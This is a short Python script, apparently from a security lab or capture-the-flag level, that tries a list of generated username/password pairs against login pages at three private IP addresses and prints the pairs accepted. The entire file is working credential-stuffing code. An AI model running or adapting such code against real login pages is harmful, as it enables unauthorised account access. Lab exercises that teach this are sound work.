import requests
#possible creds generated by level
#one of them is valid for one of your web app  
from credentials import creds





#url='http://YOUR_INTERNAL_IP/login'
urls=['http://10.138.0.58/login', 'http://10.138.0.59/login','http://10.138.0.60/login']


for url in urls:
	for u in creds:
		#prepare data for post request
		payload={'username':u,'password':creds[u]}
                #send username and password through post method to web app url
		post=requests.Session().post(url, data=payload)
                #check if respond text contains invalid credentails
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+creds[u]+' ' + url )

